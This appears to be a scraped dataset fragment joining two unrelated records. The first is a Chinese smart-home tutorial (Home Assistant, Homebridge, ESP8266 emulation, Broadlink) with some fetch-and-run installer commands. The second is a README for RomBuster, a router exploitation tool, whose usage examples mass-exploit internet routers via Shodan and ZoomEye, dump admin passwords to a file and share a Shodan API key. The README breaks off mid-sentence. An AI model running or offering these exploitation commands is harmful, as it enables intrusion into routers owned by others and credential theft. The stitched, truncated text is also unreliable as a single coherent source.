\u4e0a\u7684\u5f00\u6e90\u5bb6\u5ead\u81ea\u52a8\u5316\u5e73\u53f0\u3002\u80fd\u8ddf\u8e2a\u548c\u63a7\u5236\u5bb6\u5ead\u4e2d\u7684\u6240\u6709\u8bbe\u5907\uff0c\u5e76\u5b9e\u73b0\u81ea\u52a8\u5316\u63a7\u5236\uff0c\u540c\u65f6\u8fd8\u5b8c\u7f8e\u7684\u652f\u6301\u5728 raspberry pi \u4e0a\u3002\n\u901a\u8fc7 home assistant \u63d2\u4ef6\uff0c\u5b83\u53ef\u4ee5\u76f4\u63a5\u517c\u5bb9\u5404\u5f0f\u786c\u4ef6\u8bbe\u5907\u3002\u5176\u539f\u7406\u662f\u901a\u8fc7 wifi\u3001ble\u3001zigbee\u3001mqtt \u7b49\u4e0d\u540c\u7684\u534f\u8bae\uff0c\u6765\u4e0e\u4e0d\u540c\u7684\u672c\u5730\u8bbe\u5907\u4e92\u8054\uff0c\u5e76\u63d0\u4f9b\u4e00\u4e2a\u54cd\u5e94\u5f0f\u7684 web \u754c\u9762\u3001pwa \u5e94\u7528\u3001ios \u5e94\u7528\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u5730\u4e0e\u8bbe\u5907\u8fdb\u884c\u4ea4\u4e92\u3002\n\u5176\u5728\u684c\u9762\u6d4f\u89c8\u5668\u4e0a\u7684\u754c\u9762\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u624b\u673a\u6d4f\u89c8\u5668\u7684\u754c\u9762\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u5bf9\u4e8e\u63d0\u4f9b\u4e30\u5bcc\u529f\u80fd\uff08\u5982 rgb \u706f\uff09\u7684\u8bbe\u5907\u6765\u8bf4\uff0c\u5b83\u4e5f\u80fd\u652f\u6301\u4e30\u5bcc\u7684\u64cd\u4f5c\uff0c\u5373\u4e0a\u56fe\u3002\u540c\u65f6\uff0c\u8fd8\u80fd\u63a5\u4e0a amazon echo\u3001homekit \u7b49\u5404\u5f0f\u5404\u6837\u7684\u4e2d\u5fc3\u3002\nhomebridge\nhomekit \u662f\u7531 apple \u516c\u53f8\u63a8\u51fa\u7684\u667a\u80fd\u5bb6\u5c45\u5e73\u53f0\uff0c\u5305\u62ecios \u4e0a\u7684 sdk\u3001\u667a\u80fd\u5bb6\u5c45\u786c\u4ef6\u901a\u4fe1\u534f\u8bae (hap: homekit accessory protocol) \u3001\u4ee5\u53ca mfi(made for iphone/ipod/ipad) \u8ba4\u8bc1\u7b49\u7b49\u3002\n\u501f\u52a9\u4e8e iphone\u3001ipad\u3001iwatch \u7b49\u8bbe\u5907\u53ca\u300e\u5bb6\u5ead\u300f\u5e94\u7528\uff0c\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u5730\u638c\u63a7\u5404\u79cd homekit \u914d\u4ef6\u3002\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u8bbe\u5907\u4e0a siri \u5e94\u7528\u3001homepod\uff0c\u76f4\u63a5\u7528\u8bed\u97f3\u6765\u4e0e\u8bbe\u5907\u4ea4\u4e92\u3002\n\u5f53\u524d\u8981\u5728 homekit\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\uff1a\n\u8d2d\u4e70\u6602\u8d35\u7684 mfi \u8bbe\u5907\u3002\n\u501f\u52a9\u4e8e home assistant\uff0c\u6765\u81ea\u5efa homekit api \u670d\u52a1\u8fde\u63a5\u8bbe\u5907\u3002\n\u6a21\u62df\u73b0\u6709\u7684 mfi \u8bbe\u5907\u3002\u8bf8\u5982\u4f7f\u7528 esp8266 \u4eff\u771f philip hues\u3002\n\u5f15\u81ea\uff1a\u4f7f\u7528ios homekit\u63a7\u5236\u6811\u8393\u6d3e\uff1ahap \u534f\u8bae\u90e8\u5206\u662f\u9700\u8981\u52a0\u5165 mfi program \u624d\u80fd\u83b7\u53d6\u6587\u6863\uff0c\u800c\u4e14 mfi program \u65e0\u6cd5\u4ee5\u4e2a\u4eba\u5f00\u53d1\u8005\u8eab\u4efd\u52a0\u5165\u3002\n\u56e0\u6b64\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u501f\u52a9\u4e8e homebridge\u3002\nhomebridge \u662f\u4e00\u4e2a\u7528 node.js \u5b9e\u73b0\u7684\u8f7b\u91cf\u7ea7\u540e\u53f0\uff0c\u53ef\u4ee5\u5728\u5bb6\u5ead\u7f51\u7edc\u4e0a\u8fd0\u884c\uff0c\u7528\u4e8e\u6a21\u62dfios homekit api\u3002 \u5b83\u652f\u6301\u63d2\u4ef6\u2014\u2014\u7531\u793e\u533a\u63d0\u4f9b\u7684\u6a21\u5757\uff0c\u8fd9\u4e9b\u63d2\u4ef6\u80fd\u63d0\u4f9b\u4ece homekit \u5230 \u201c\u667a\u80fd\u5bb6\u5c45\u201d \u8bbe\u5907\u5236\u9020\u5546\uff0c\u63d0\u4f9b\u7684\u5404\u79cd\u7b2c\u4e09\u65b9api\u7684\u57fa\u672c\u6865\u6881\u3002\n\u800c\u6211\u4eec\u53ea\u9700\u8981\u6709\u4e00\u4e2a iphone \u5728\u624b\u4fbf\u53ef\u4ee5\u4e86\u3002\n\u8bbe\u5907\n\u5982\u679c\u53ea\u6709\u4e0a\u9762\u7684\u51e0\u79cd\u4e2d\u5fc3\u7f51\u5173\uff0c\u800c\u7f3a\u5c11\u8bbe\u5907\uff0c\u90a3\u4e48\u6574\u4e2a\u667a\u80fd\u7684\u4e2d\u5fc3\u5c31\u662f\u4e0d\u5b8c\u5584\u7684\u3002\u800c\u8fd9\u4e5f\u662f\u6700\u8fd1\u51e0\u5e74\u6765\uff0c\u9650\u5236\u667a\u80fd\u5bb6\u5c45\u53d1\u5c55\u7684\u4e00\u4e2a\u56e0\u7d20\uff1a\u627e\u4e0d\u5230\u5408\u9002\u7684\u7528\u6237\u9700\u6c42\u3002\n\u901a\u8baf\u673a\u5236\u4e0e\u534f\u8bae\nwemo\nzigbee\nwifi\nble\n\u8fd9\u662f\u4e00\u79cd\u65e0\u7ebf\u6280\u672f\u6807\u51c6\uff0c\u7528\u6765\u8ba9\u56fa\u5b9a\u4e0e\u79fb\u52a8\u8bbe\u5907\uff0c\u5728\u77ed\u8ddd\u79bb\u95f4\u4ea4\u6362\u6570\u636e\uff0c\u4ee5\u5f62\u6210\u4e2a\u4eba\u5c40\u57df\u7f51\uff08pan\uff09\u3002\u5176\u4f7f\u7528\u77ed\u6ce2\u7279\u9ad8\u9891\uff08uhf\uff09\u65e0\u7ebf\u7535\u6ce2\uff0c\u7ecf\u75312.4\u81f32.485 ghz\u7684ism\u9891\u6bb5\u6765\u8fdb\u884c\u901a\u4fe1\u3002\n\u7ea2\u5916\u6447\u63a7\n\u7ea2\u5916\u9065\u63a7\u662f\u4e00\u79cd\u65e0\u7ebf\u3001\u975e\u63a5\u89e6\u63a7\u5236\u6280\u672f\uff0c\u5177\u6709\u6297\u5e72\u6270\u80fd\u529b\u5f3a\uff0c\u4fe1\u606f\u4f20\u8f93\u53ef\u9760\uff0c\u529f\u8017\u4f4e\uff0c\u6210\u672c\u4f4e\uff0c\u6613\u5b9e\u73b0\u7b49\u663e\u8457\u4f18\u70b9\u3002\n\u5e38\u89c1\u7684\u8bbe\u5907\u6709\u7535\u89c6\u673a\u3001\u7535\u8c03\u7684\u9065\u63a7\u5668\u3002\n\u65e7\u8bbe\u5907\u4e2d\u67a2\n\u5982\u5c0f\u7c73\u7684\u4e07\u80fd\u9065\u63a7\u3001broadlink rm pro\n\u4eff\u771f\u8bbe\u5907\n\u8bbe\u5907\uff1a\namazone echo dot\nnodemcu\nbroadlink rm pro\nyeelight\nraspberry pi 2\nandroid\u3001ios \u8bbe\u5907\n\u5b9e\u6218\u8bbe\u5907\u7bc7\nesp8266 \u4eff\u771f\u8bbe\u5907\nwemo\uff1a\u53ef\u4ee5\u88ab amazon echo \u8bc6\u522b\nphilips hue\uff1a\u53ef\u4ee5\u88ab homekit \u8bc6\u522b ?\nesp8266 \u4eff\u771f wemo\n\u8981\u6c42\uff1a\u4e0b\u8f7d ardunio ide\uff0c\u5730\u5740\uff1a http://www.arduino.cc/en/main/software\n\u4e00\u3001\u5b89\u88c5 arduino esp8266\narduino esp8266 github \u5730\u5740\uff1a https://github.com/esp8266/arduino\n\u5b89\u88c5\u65b9\u6cd5\uff1a\n\u542f\u52a8 arduino ide\uff0c\u5e76\u8fdb\u5165 preferences \u7a97\u53e3\n\u5728 additional board manager urls \u4e2d\u8f93\u5165\uff1a http://arduino.esp8266.com/stable/package_esp8266com_index.json\n\u4ece tools > board \u83dc\u5355\u4e2d\u6253\u5f00 boards manager\uff0c\u5e76\u8f93\u5165\u5b89\u88c5 esp8266 \u5e73\u53f0\n\u4e8c\u3001\u6d4b\u8bd5\u4eff\u771f\n\u4e0b\u8f7d\u5b89\u88c5\u5305\uff1ahttps://github.com/kakopappa/arduino-esp8266-alexa-multiple-wemo-switch\nsetup \u6b65\u9aa4\uff1a\n\u4e0b\u8f7d\u4ee3\u7801\n\u5728\u7f16\u8f91\u5668\u4e2d\u6253\u5f00 wemos.ino\n\u4fee\u6539 wifi \u8bbe\u7f6e\n\u5b9a\u4e49\u5f00\u5173\u53ca\u5176\u56de\u8c03\uff0c\u5728 officelightson\u3001officelightsoff\u3001kitchenlightson\u3001kitchenlightsoff \u4e2d\n\u70e7\u5f55\n\u76f8\u4f3c\u9879\u76ee arduino esp8266 alexa wemo switch emulator\uff1ahttps://github.com/witnessmenow/esp8266-alexa-wemo-emulator\nesp8266 \u4eff\u771f philips hue\nesp8266 hue emulator \u9879\u76ee\u5730\u5740\uff1aesp8266hueemulator\n\u8fd9\u4e2a demo \u9700\u8981\u8fd9\u4e48\u51e0\u4e2a\u5e93neopixelbus\u3001ajson\u3001time\u3001ntpclient\uff0c\u540c\u65f6\u8fd8\u9700\u8981\u4fee\u6539\u4e00\u4e9b\u76f8\u5173\u7684\u914d\u7f6e\u3002\n\u56e0\u6b64\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u5b89\u88c5\uff0c\u6bd4\u8f83\u7b80\u5355\uff1a\n\u6ce8\u610f\uff1a\u5982\u679c\u662f mac os\uff0c\u9700\u8981\u5c06\u4e0b\u9762\u811a\u672c\u4e2d\u7684 $home/arduino/libraries/ \u6539\u4e3a $home/documents/arduino/libraries/\nmkdir -p $home/arduino/libraries/\ncd $home/arduino/libraries/\ngit clone --branch 2.1.4 https://github.com/makuna/neopixelbus.git\ngit clone https://github.com/interactive-matter/ajson.git\ngit clone https://github.com/paulstoffregen/time.git\ngit clone https://github.com/gmag11/ntpclient.git\nsed -i -e 's|#define print_buffer_len 256|#define print_buffer_len 4096|g' ajson/ajson.h\ncd -\ngit clone https://github.com/probonopd/esp8266hueemulator.git\nsed -i -e 's|#include \"/secrets.h\"|//#include \"/secrets.h\"|g' esp8266hueemulator/esp8266hueemulator/esp8266hueemulator.ino\nsed -i -e 's|//const char|const char|g' esp8266hueemulator/esp8266hueemulator/esp8266hueemulator.ino\n\u518d\u5c06\u4ee3\u7801\u70e7\u5f55\u5230 esp8266 \u4e0a\uff0c\u5c31\u53ef\u4ee5\u5728 homekit \u770b\u5230\u76f8\u5e94\u7684\u914d\u7f6e\u3002\n\u5c0f\u7c73\u667a\u80fd\u63d2\u5ea7\n\u5bfb\u627e\u8bbe\u5907\nnpm install -g miio\nmiio --discover\nnpm install --save miio\n\u96c6\u6210\u7f51\u5173\u7bc7\nraspberry pi home assistant\nimages: https://home-assistant.io/docs/hassbian/installation/\nimages downloader: https://etcher.io/\n\u53d1\u73b0\u6587\u6863\u597d\u50cf\u6709\u70b9\u95ee\u9898\uff0c\u4fbf\u624b\u52a8\u5730\u5c1d\u8bd5\u5b89\u88c5\uff1a\npip3 install --upgrade homeassistant\n\u8fd0\u884c\nsudo -u homeassistant -h /srv/homeassistant/bin/hass\n\u5e76\u4e0d\u6ca1\u5de5\u4f5c\uff0c\u4e8e\u662f\u6267\u884c\u5b98\u65b9\u7684\u5b89\u88c5\u811a\u672c\uff1a\ncurl -o https://raw.githubusercontent.com/home-assistant/fabric-home-assistant/master/hass_rpi_installer.sh && sudo chown pi:pi hass_rpi_installer.sh && bash hass_rpi_installer.sh\n\u53c8\u5728\u6211\u7684 mbp \u4e0a\u5b89\u88c5\u5c1d\u8bd5\npip3 install homeassistant\nhass --open-ui\n\u7136\u540e\u53d1\u73b0\u5b89\u88c5\u5b8c\u5c31\u53ef\u4ee5\u4e86\u3002\nhome assistant broadlink pm pro\n\u5728 configuration.yaml \u6587\u4ef6\u4e2d\u6dfb\u52a0\u4e0b\u9762\u7684\u914d\u7f6e\uff1a\n# example configuration.yaml entry\nswitch:\n- platform: broadlink\nhost: ip_address\nmac: 'mac_address'\nswitches:\nreciever:\ncommand_on: 'switch_packet on'\ncommand_off: 'switch_packet off'\n\u83b7\u53d6 broadlink \u914d\u7f6e\n\u4ece https://github.com/nightrang3r/broadlink-e-control-db-dump \u83b7\u53d6\u6570\u636e\u5bfc\u51fa\u811a\u672c\n\u6253\u5f00 \u6613\u63a7\uff08\u82f1\u8bed\uff1ae-control\uff09 \u5e94\u7528\uff0c\u70b9\u51fb\u83dc\u5355 -> \u5171\u4eab -> \u4e91\u5206\u4eab \u5c31\u4f1a\u751f\u6210\u76f8\u5e94\u7684\u914d\u7f6e\u6587\u4ef6\n\u6d4f\u89c8\u624b\u673a\u4e0a\u7684 /broadlink/newremote/shareddata/ \u76ee\u5f55\uff0c\u590d\u5236\u51fa jsonsubir\u3001jsonbutton\u3001jsonircode \u4e09\u4e2a\u6587\u4ef6\n\u5b89\u88c5\u597d python \u73af\u5883\uff0c \u5e76\u5b89\u88c5 pip install simplejson\n\u6267\u884c\u7b2c\u4e00\u6b65\u4ee3\u7801\u4e2d\u7684\u811a\u672c\uff0cpython getbroadlinkshareddata.py\n\u5b89\u88c5python-broadlink\uff0c\u5730\u5740 https://github.com/mjg59/python-broadlink.git\n\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u6211\u7684\u7a7a\u8c03\u95ee\u9898\uff0c\u83b7\u53d6\u5230\u7684\u914d\u7f6e\u662f\u7a7a\u7684\u3002\nhomebridge\n\u76f8\u5173\u7684\u63d2\u4ef6\uff1a\nyeelight\uff1ahomebridge-yeelight\n\u5c0f\u7c73\u8bbe\u5907\uff1ahomebridge-aqara\nbroadlink rm \u7ea2\u5916\uff1ahomebridge-broadlink-rm\nbroadlink sp \u5f00\u5173: homebridge-broadlink-sp\nhome assistant: homebridge-homeassistant\n\u5b89\u88c5 homebridge\n\u7f16\u8f91\u8f6f\u4ef6\u6e90\nsudo vim /etc/apt/sources.list\n\u4fee\u6539\u4e3a\u963f\u91cc\u4e91\uff0c\u901f\u5ea6\u4f1a\u66f4\u5feb\u4e00\u4e9b\uff1a\ndeb http://mirrors.aliyun.com/raspbian/raspbian/ jessie main non-free contrib\ndeb-src http://mirrors.aliyun.com/raspbian/raspbian/ jessie main non-free contrib\n\u5b89\u88c5 node.js arm \u7248 \uff1a\ncurl -sl https://deb.nodesource.com/setup_7.x | sudo -e bash -\nsudo apt-get install -y nodejs\n\u5b89\u88c5 avahi\nsudo apt-get install libavahi-compat-libdnssd-dev\n\u5b89\u88c5 homebridge\nnpm install -g homebridge\n\u5b89\u88c5\u76f8\u5e94\u7684\u63d2\u4ef6\nsudo npm install -g homebridge-yeelight\nsudo npm install -g homebridge-homeassistant\nsudo npm install -g homebridge-broadlink-sp\nsudo npm install -g homebridge-broadlink-rm\nsudo npm install -g homebridge-platform-wemo\nsudo npm install -g homebridge-miio\n\u5bf9\u5e94\u7684\u914d\u7f6e\u5728 home-assistant \u76ee\u5f55\u4e0b\u7684 configuration.yaml \u6587\u4ef6\u3002\n\u5f00\u673a\u542f\u52a8\n\u5728 /etc/default \u76ee\u5f55\u4e0b\u521b\u5efa homebridge \u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\n#defaults / configuration options for homebridge\n#the following settings tells homebridge where to find the config.json file and where to persist the data (i.e. pairing and others)\nhomebridge_opts=-u /var/lib/homebridge\n# if you uncomment the following line, homebridge will log more\n# you can display this via systemd's journalctl: journalctl -f -u homebridge\n# debug=*\n\u5728 /etc/systemd/system \u76ee\u5f55\u4e0b\u521b\u5efa homebridge.service \u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\n[unit]\ndescription=node.js homekit server\nafter=syslog.target network-online.target\n[service]\ntype=simple\nuser=homebridge\nenvironmentfile=/etc/default/homebridge\n# adapt this to your specific setup (could be /usr/bin/homebridge)\n# see comments below for more information\nexecstart=/usr/local/bin/homebridge $homebridge_opts\nrestart=on-failure\nrestartsec=10\nkillmode=process\n[install]\nwantedby=multi-user.target\n\u542f\u52a8\u670d\u52a1\nsystemctl daemon-reload\nsystemctl enable homebridge\nsystemctl start homebridge\nhomebridge \u96c6\u6210 home assistant\n\u5b89\u88c5\u63d2\u4ef6\uff1a\nnpm install -g homebridge-homeassistant\n\u6dfb\u52a0\u914d\u7f6e\uff1a\n\"platforms\": [\n{\n\"platform\": \"homeassistant\",\n\"name\": \"homeassistant\",\n\"host\": \"http://127.0.0.1:8123\",\n\"password\": \"yourapipassword\",\n\"supported_types\": [\"binary_sensor\", \"climate\", \"cover\", \"device_tracker\", \"fan\", \"group\", \"input_boolean\", \"light\", \"lock\", \"media_player\", \"scene\", \"sensor\", \"switch\"],\n\"logging\": true\n}\n]\namazon echo \u8bbe\u7f6e\n\u6211\u7528\u7684\u662f amazon echo dot 2 \u5c31\u662f\u90a3\u4e2a mini \u7248\u7684\n\u5b89\u88c5 yeelight skill\n\u5b89\u88c5 mijia\n\u4e24\u8005\u9700\u8981\u767b\u5f55\u5c0f\u7c73\u7684\u8d26\u53f7\uff0c\u624d\u80fd\u6388\u6743\u83b7\u5f97\u63a7\u5236\u3002\n\u7ed3\u5408 homeassistant \u548c amazon echo\n\u6587\u6863\uff1ahttps://home-assistant.io/components/alexa/\n\u5982\u679c\u53ea\u662f\u4e3a\u4e86\u6253\u5f00\u3001\u5173\u95ed\u8bbe\u5907\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 emulated_hue \u7ec4\u4ef6\uff0c\u5b83\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u865a\u62df\u7684 philips hue \u6865\u3002\n\u53ea\u5f00\u5173\u8bbe\u5907\n\u4f7f\u7528 home assistant \u7684 emulated hue \u7ec4\u4ef6\u5c31\u53ef\u4ee5\u4e86\uff0c\u6dfb\u52a0\u5982\u4e0b\u7684\u914d\u7f6e\uff1a\nemulated_hue:\nhost_ip: 192.168.199.242\n\u5176\u4e2d\u7684 192.168.199.242 \u5373\u662f home assistant \u7684\u670d\u52a1\u5668\u5730\u5740\n\u66f4\u8be6\u7ec6\u7684\u914d\u7f6e\uff0c\u5982\uff1ahttps://github.com/teagan42/homeassistantconfig\n\u5b9a\u5236\u547d\u4ee4\n\u4e3a\u4e86\u4f7f\u7528\u66f4\u591a\u7684\u529f\u80fd\uff0c\u5219\u9700\u8981\u4f7f\u7528\u5c06 home assistant \u66b4\u9732\u5230\u516c\u7f51\u4e0a\u2014\u2014\u4f7f\u7528\u8bf8\u5982\u82b1\u751f\u58f3\u7b49\u3002\uff08ps:\u7531\u4e8e\u5f53\u524d\u5bb6\u91cc\u4f7f\u7528\u7684\u662f\u5149\u7ea4\uff0c\u9700\u8981\u5149\u7ea4\u732b\uff0c\u5b9e\u65bd\u4e0a\u6bd4\u8f83\u56f0\u96be\uff1b\u56e0\u6b64\uff0c\u5916\u90e8\u8bbf\u95ee\u9700\u8981\u4f7f\u7528\u4e00\u7ea7\u8dcc\u5e45\uff0c\u6682\u65f6\u6ca1\u6709\u8fdb\u884c\u8fd9\u65b9\u9762\u7684\u5c1d\u8bd5\uff09\u3002\n\u968f\u540e\u5728 amazon developer console\n\u521b\u5efa\u76f8\u5e94\u7684 alexa skill\uff0c\u5e76\u6dfb\u52a0 endpoing\uff1ahttps://your_host/api/alexa?api_password=your_api_password\n\u5fc5\u987b\u4f7f\u7528 https\n\u5b9a\u5236 home assistant\nhome assistant restful api \u5730\u5740\uff1ahome assistant api\n\u7ed3\u5408 esp8266 + broadlink + amazon echo\n\u5728\u4e0a\u9762\u6211\u4eec\u8bf4\u5230\uff0cesp8266 \u53ef\u4ee5\u6a21\u62df\u6210 wemo \u8bbe\u5907\uff0c\u800c wemo \u53ef\u4ee5\u76f4\u63a5\u7531 amazon echo \u8bc6\u522b\u3002\u4f46\u662f broadlink \u76f4\u63a5\u4e0e amazon echo \u914d\u5408\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\u3002\u5728\u770b\u5230\u4e86python-broadlink \u5e93\uff0c\u4fbf\u60f3\u7740\u662f\u4e0d\u662f\u76f4\u63a5\u62ff flask \u7ed3\u5408\u4e00\u4e0b broadlink \u5c31\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684 http \u670d\u52a1\u3002\u968f\u540e\uff0cesp8266 \u53ea\u9700\u8981\u51e0\u4e2a\u8bf7\u6c42\u5427\uff0c\u5c31\u80fd\u76f4\u63a5\u5bf9\u5bb6\u7535\u8fdb\u884c\u63a7\u5236\u3002\nbroadlink http server\n\u4e3a\u4e86\u907f\u514d\u81ea\u5df1\u9020\u5e95\u5c42\u7684\u8f6e\u5b50\uff0c\u60f3\u5728 github \u4e0a\u5bfb\u89c5\u4e86\u4e00\u756a\uff0c\u627e\u5230 broadlink-http-rest \u9879\u76ee\uff0c\u4fee\u6539\u6210\u9002\u5408\u81ea\u5df1\u9700\u6c42\u7684\u4ee3\u7801\uff0c\u653e\u5728\u4e86 github \u4e0a\uff1ahttps://github.com/phodal/broadlink-http-rest\n\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u6240\u9700\u8981\u505a\u7684\u5c31\u662f\uff0c\u4fee\u6539\u81ea\u5df1\u7684 settings.py \u6587\u4ef6\u3002\u5e76\u4e14\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u53ef\u4ee5\u76f4\u63a5\u7531 api \u6765\u751f\u6210\u3002\u642d\u5efa\u4e4b\u524d\uff0c\u5148\u4e0b\u8f7d\u4e0a\u9762\u7684\u4ee3\u7801\uff1a\ngit clone https://github.com/phodal/broadlink-http-rest\n\u7136\u540e\u5b89\u88c5\u4f9d\u8d56\uff1a\npip install -r requirements.txt\n\u518d\u8fd0\u884c\u8d77\u670d\u52a1: python server.py\n\u7136\u540e\u8bbf\u95ee\uff1ahttp://localhost:8080/learncommand/tvon\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u5b66\u4e60\u7ea2\u5916\u6307\u4ee4\u3002\n\u63a5\u7740\u901a\u8fc7\u8bbf\u95ee\uff1ahttp://localhost:8080/sendcommand/tvon\uff0c\u5c31\u53ef\u4ee5\u53d1\u9001\u76f8\u5e94\u7684\u7ea2\u5916\u7f16\u7801\u3002\n\u540c\u65f6\uff0c\u5b83\u4f1a\u5728 settings.py \u4e0b\u751f\u6210\u76f8\u5e94\u7684 tvon \u547d\u4ee4\u53ca\u7f16\u7801\uff0c\u5982\u4e0b\uff1a\n[commands]\ntvon = 9bff369b8c9f94d6a2ec86e2b83749670662283a956794365cfb8ecf42d42cc41256a408c128a0bcbe56e6050b561e1436c998299ff9adc8a17d8350d55341e83eca9d5bb905472e5a23bc035f94dab944af2de6513b09502c17b385fca66090\n\u540c\u6837\u7684\uff0c\u5bf9\u4e8e\u5173\u95ed\u8bbe\u5907\u6765\u8bf4\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528 tvoff\u3002\n\u4ee5\u6b64\u7c7b\u63a8\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f55\u5165\u6240\u6709\u7684\u8bbe\u5907\u3002\n\u4f7f\u7528 esp8266 \u63a7\u5236 broadlink\n\u6253\u5f00 smart-home/emulator/esp8266-wemos/esp8266-wemos.ino \u6587\u4ef6\uff0c\u5199\u4e2a\u8d1f\u8d23\u53d1\u8bf7\u6c42\u7684\u65b9\u6cd5\uff1a\nvoid httpserver(string command) {\nhttpclient http;\nserial.print(\"[http] begin...\\n\");\n// configure traged server and url\n//http.begin(\"https://192.168.1.12/test.html\", \"7a 9c f4 db 40 d3 62 5a 6e 21 bc 5c cc 66 c8 3e a1 45 59 38\"); //https\nhttp.begin(\"http://192.168.199.170:8080/sendcommand/\" + command); //http\nserial.print(\"[http] get...\\n\");\n// start connection and send http header\nint httpcode = http.get();\n// httpcode will be negative on error\nif(httpcode > 0) {\n// http header has been send and server response header has been handled\nserial.printf(\"[http] get... code: %d\\n\", httpcode);\n// file found at server\nif(httpcode == http_code_ok) {\nstring payload = http.getstring();\nserial.println(payload);\n}\n} else {\nserial.printf(\"[http] get... failed, error: %s\\n\", http.errortostring(httpcode).c_str());\n}\n}\n\u5bf9\u5e94\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5199\u76f8\u5e94\u7684\u63a7\u5236\u903b\u8f91\uff1a\nvoid tvon() {\nhttpserver(\"tvon\");\n}\nvoid tvoff() {\nhttpserver(\"tvoff\");\n}\nvoid boxon() {\nhttpserver(\"mion\");\n}\nvoid boxoff() {\nhttpserver(\"mioff\");\n}\nvoid airon() {\nhttpserver(\"airon\");\n}\nvoid airoff() {\nhttpserver(\"airoff\");\n}\n\u4fbf\u53ef\u4ee5\u4f7f\u7528 esp8266 \u63a7\u5236 broadlink\u3002\n\u6700\u540e\uff0c\u4fbf\u662f\u70e7\u5f55\u7a0b\u5e8f\uff0c\u7136\u540e\u76f4\u63a5\u4f7f\u7528 amazon echo \u63a7\u5236\u3002\nraspberry pi cornata\n\u5b98\u65b9\u6587\u6863\uff1ause cortana function on iot core\n\u4e0b\u8f7d windows 10 iot core dashboard\n\u4e0b\u8f7d\u5730\u5740\uff1ahttps://developer.microsoft.com/en-us/windows/iot/docs/iotdashboard\n\u5b89\u88c5\u6700\u65b0\u955c\u50cf\n\u6253\u5f00 windows 10 iot core dashboard\uff0c\u4e3a rpi \u70e7\u5f55\u955c\u50cf\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n\u5b98\u65b9\u5efa\u8bae\u8981\u66f4\u65b0\u5230\u6700\u65b0\u3002\u4f7f\u7528 web \u754c\u9762\u6253\u5f00\u8bbe\u5907\u7684 windows update\uff0chttp://:8080/#windows%20update\uff0c\u5982http://192.168.199.223:8080/#windows%20update\u3002\n\u7136\u540e\u5230 devices \u4e2d\u770b\u662f\u5426\u51fa\u73b0\u76f8\u5e94\u7684 microphone \u8bbe\u7f6e\u3002\u3002\n\u5f00\u673a\u542f\u52a8 cortana\n\u5728\u9996\u9875\u7684 device settigns \u6700\u4e0b\u9762\u6709\u4e00\u4e2a start cortana on boot \u7684\u9009\u9879\u3002\n\u4f7f\u7528 windows iot remote server \u8bbf\u95ee\uff1a\u5728 http://192.168.199.223:8080/#remote \u5728\u52fe\u4e0a enable windows iot remote server\n\u8bbe\u7f6e speechlanguage \u6210\u4e2d\u6587\uff1a\n\u6253\u5f00 processes -> run command\uff0c\u6267\u884c\uff1a\niotsettings -set region cn\niotsettings -set speechlanguage zh-hans-cn\n\u5b66\u4e60\u7528\u6237\u4e60\u60ef\ntbd\n\u5de5\u5177\u96c6\ntools:\nalexa skill testing -----> tool !!! \nraspberry pi burn images tools\nlicense\n\u00a9 2017 a phodal huang's idea. this code is distributed under the mit license. see license in this directory.\n\u5f85\u6211\u4ee3\u7801\u7f16\u6210\uff0c\u5a36\u4f60\u4e3a\u59bb\u53ef\u597d\nfootnotes\nhttps://en.wikipedia.org/wiki/home_automation \u21a9", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000426, "year": null}, {"Unnamed: 0": 431, "autor": 431, "date": null, "content": "RomBuster\nRomBuster is a router exploitation tool that allows to disclosure network router admin password.\nFeatures\nExploits vulnerabilities in most popular routers such as D-Link, Zyxel, TP-Link, Cisco and Huawei.\nOptimized to exploit multiple routers at one time from list.\nSimple CLI and API usage.\nInstallation\npip3 install git+https://github.com/EntySec/RomBuster\nBasic usage\nTo use RomBuster just type rombuster in your terminal.\nusage: rombuster [-h] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN]\n[--zoomeye ZOOMEYE] [-p PAGES]\nRomBuster is a router exploitation tool that allows to disclosure network\nrouter admin password.\noptional arguments:\n-h, --help show this help message and exit\n-o OUTPUT, --output OUTPUT\nOutput result to file.\n-i INPUT, --input INPUT\nInput file of addresses.\n-a ADDRESS, --address ADDRESS\nSingle address.\n--shodan SHODAN Shodan API key for exploiting devices over Internet.\n--zoomeye ZOOMEYE ZoomEye API key for exploiting devices over Internet.\n-p PAGES, --pages PAGES\nNumber of pages you want to get from ZoomEye.\nExamples\nExploiting single router\nLet's hack my router just for fun.\nrombuster -a 192.168.99.1\nExploiting routers from Internet\nLet's try to use Shodan search engine to exploit routers over Internet.\nrombuster --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD\nNOTE: Given Shodan API key (PSKINdQe1GyxGgecYz2191H2JoS9qvgD) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)\nExploiting routers from input file\nLet's try to use opened database of routers.\nrombuster -i routers.txt -o passwords.txt\nNOTE: It will exploit all routers in routers.txt list by their addresses and save all obtained passwords to passwords.txt.\nAPI usage\nRomBuster also has their own Python API that can be invoked by importing RomBuster to your code.\nfrom rombuster import RomBuster\nBasic functions\nThere are all RomBuster basic functions that can be used to exploit specified 